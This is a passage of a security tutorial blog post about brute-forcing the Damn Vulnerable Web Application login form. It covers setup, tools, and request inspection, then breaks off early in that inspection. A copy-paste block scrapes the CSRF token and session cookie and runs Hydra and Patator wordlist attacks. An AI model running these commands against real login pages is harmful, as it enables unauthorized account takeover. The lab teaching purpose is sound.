---
title: DVWA - Main Login Page - Brute Force HTTP POST Form With CSRF Tokens
url: https://blog.g0tmi1k.com/dvwa/login/
source: Over Security - Cybersecurity news aggregator
date: 2022-10-25
fetch_date: 2025-10-03T20:48:57.479052
---

# DVWA - Main Login Page - Brute Force HTTP POST Form With CSRF Tokens

* [RSS](/atom.xml "subscribe via RSS")

* [Blog](/)
* [Archives](/archives/)

# DVWA - Main Login Page - Brute Force HTTP POST Form With CSRF Tokens

Upon installing [Damn Vulnerable Web Application (DVWA)](http://dvwa.co.uk/), the first screen will be the main login page. Even though technically this is not a module, why not attack it? DVWA is made up of designed exercises, one of which is a challenge, [designed to be to be brute force](https://blog.g0tmi1k.com/dvwa/bruteforce-low/).

![DVWA Login](/images/dvwa-login-code.png "DVWA Login")

Let's pretend we did not [read the documentation](https://github.com/RandomStorm/DVWA/blob/master/README.md), the message shown on the setup screens, as well as on the [homepage](http://dvwa.co.uk/) of the software when we downloaded the web application.

Let's forget the default login is: `admin`:`password` *(which is also a very common default login)*!

Let's play dumb and brute force it =).

---

**TL;DR**: Quick copy/paste

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 ``` | ``` CSRF=$(curl -s -c dvwa.cookie "192.168.1.44/DVWA/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2) SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')  hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt  -P /usr/share/seclists/Passwords/500-worst-passwords.txt \   -e ns  -F  -u  -t 1  -w 10  -V  192.168.1.44  http-post-form \   "/DVWA/login.php:username=^USER^&password=^PASS^&user_token=${CSRF}&Login=Login:S=Location\: index.php:H=Cookie: security=impossible; PHPSESSID=${SESSIONID}"  patator  http_fuzz  method=POST  follow=0  accept_cookie=0 --threads=1  timeout=10 \   url="http://192.168.1.44/DVWA/login.php" \   1=/usr/share/seclists/Usernames/top_shortlist.txt  0=/usr/share/seclists/Passwords/500-worst-passwords.txt \   body="username=FILE1&password=FILE0&user_token=${CSRF}&Login=Login" \   header="Cookie: security=impossible; PHPSESSID=${SESSIONID}" \   -x quit:fgrep=index.php ``` |

---

Table of Contents

* + [Objectives](#Objectives)
  + [Setup](#Setup)
  + [Tools](#Tools)
  + [Information Gathering](#Information.Gathering)
    - [Login Form (Apache Redirect)](#Login.Form..Apache.Redirect.)
    - [Login Form (DVVA Redirect)](#Login.Form..DVVA.Redirect.)
    - [Login Form (Rendered Login Prompt)](#Login.Form..Rendered.Login.Prompt.)
    - [Login Form (HTML)](#Login.Form..HTML.)
    - [Login Form (Differentiating Responses)](#Login.Form..Differentiating.Responses.)
    - [Login Form (Re-using CSRF Tokens)](#Login.Form..Re-using.CSRF.Tokens.)
  + [Brute Force (Testing)](#Brute.Force..Testing.)
    - [Hydra (Documentation)](#Hydra..Documentation.)
    - [Hydra (Test/Debug Command)](#Hydra..Test.Debug.Command.)
    - [Hydra Issues](#Hydra.Issues)
      * [Issue #1 (Additional GET Requests)](#Issue..1..Additional.GET.Requests.)
      * [Issue #2 (Missing Parameters/Proxying Hydra)](#Issue..2..Missing.Parameters.Proxying.Hydra.)
    - [Switching from Blacklisting to Whitelisting](#Switching.from.Blacklisting.to.Whitelisting)
    - [Match and Replace](#Match.and.Replace)
    - [Troubleshooting Rambles](#Troubleshooting.Rambles)
  + [Brute Force (Hydra)](#Brute.Force..Hydra.)
    - [**Hydra Main Command**](#L.strong.Hydra.Main.Command..strong.)
  + [Brute Force (Patator)](#Brute.Force..Patator.)
    - [Patator (Documentation)](#Patator..Documentation.)
    - [**Patator Main Command**](#L.strong.Patator.Main.Command..strong.)
    - [Patator vs Hydra (Syntax Comparison)](#Patator.vs.Hydra..Syntax.Comparison.)
  + [Benchmarking](#Benchmarking)
  + [Proof of Concept Scripts](#Proof.of.Concept.Scripts)
    - [Bash Template](#Bash.Template)
    - [Python Template](#Python.Template)
  + [Summary](#Summary)
    - [Threads & Waiting](#Threads..amp..Waiting)
    - [Conclusion](#Conclusion)

## Objectives

* The goal is to **brute force an HTTP login** page.
  + **POST requests** are made via a **form**.
  + The web page is in a **sub folder**.
  + **Hydra & Patator** will do the grunt work.
* There is an **anti-CSRF** (Cross-Site Request Forgery) field on the form.
  + However, the token is **implemented incorrectly**.
* There is a **redirection after submitting** the credentials,
  + ...both for successful and failed logins.
* There are **not any lockouts** on account,
  + ...or any other protections or preventions in place (e.g. firewalls or Intrusion Prevention Systems - IPS).
* We go through **debugging & troubleshooting some issues**.
  + Hopefully if you make it to the bottom, you should have a deeper understanding of a methodology and various tools.

---

## Setup

* Main target: [DVWA v1.10](https://github.com/RandomStorm/DVWA/releases) (Running on `Windows XP Pro SP3 ENG x86` + [XAMPP v1.8.2](http://sourceforge.net/projects/xampp/files/XAMPP%20Windows/1.8.2/)).
  + Target setup **does not matter too much** for this - `Debian`/`Arch Linux`/`Windows`, `Apache`/`Nginx`/`IIS`, `PHP v5.x`, or `MySQL`/`MariaDB`.
  + The main target is on the IP (`192.168.1.33`), port (`80`) and subfolder (`/DVWA/`), which is known ahead of time.
  + Because the target is Windows, it does not matter about case sensitive URL requests (`/DVWA/` vs `/dvwa/`).
  + There was an issue using multi-threading brute force on this target. This is explained towards the end of the post.
* Attacker: [Kali Linux v2](https://www.kali.org/) (+ [Personal Custom Post-install Script](https://github.com/g0tmi1k/os-scripts/blob/master/kali.sh)).
  + Shell prompt will look different (due to [ZSH](http://www.zsh.org/)/[Oh-My-ZSH](https://github.com/robbyrussell/oh-my-zsh)).
  + Added colour to tools output (thanks to [GRC](https://github.com/garabik/grc)).
  + Pre-installed tools (such as [html2text](http://www.mbayer.de/html2text/)).

Both machines are running inside a Virtual Machine (VMware ESXi).

---

## Tools

* cURL - Information gathering (used for viewing source code & to automate gathering tokens).
  + Could also use wget (`wget -qO -`) instead.
  + Or using Burp/Iceweasel, however, it is harder to automate them due to them being graphical, which makes doing repetitive stuff boring.
* [THC-Hydra v8.1](https://www.thc.org/thc-hydra/) - A brute force tool.
* [Patator v0.5](https://github.com/lanjelot/patator) - Alternative brute force tool (which I currently prefer).
* [Burp Proxy v16.0.1](https://portswigger.net/burp/proxy.html) - Debugging requests.
  + Could have used [OWASP Zed Attack Proxy (ZAP)](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project) in Burp's place (which has the upside of being completely free and open source).
  + However, I personally find Burp's GUI to be more intuitive (even if features are limited without a paid license).
  + Also could have used Burp proxy suite to brute force too (just slower in the free edition). Will cover how to-do this in the [brute force module](https://blog.g0tmi1k.com/dvwa/bruteforce-low/).
* [SecLists](https://github.com/danielmiessler/SecLists) - General wordlists.
  + These are common, default and small wordlists.
  + Instead of using a custom built wordlist, which has been crafted for our target (e.g. generated with [CeWL](https://digi.ninja/projects/cewl.php)).

---

## Information Gathering

### Login Form (Apache Redirect)

Let's start off making a simple, straight forward request and display the source code of the response.

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 ``` | ``` [root:~]# curl 192.168.1.33/DVWA <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"> <html><head> <title>301 Moved Permanently</title> </head><body> <h1>Moved Permanently</h1> <p>The document has moved <a href="http://192.168.1.33/DVWA/">here</a>.</p> <hr> <address>Apache/2.4.10 (Win32) OpenSSL/1.0.1h PHP/5.4.31 Server at 192.168.1.33 Port 80</address> </body></html> [root:~]# ``` |

![Apache Redirect](/images/dvwa-login-01.png)

Notice without the trailing slash, the web service itself (Apache in this case) is redirecting us to include it.

---

### Login Form (DVVA Re...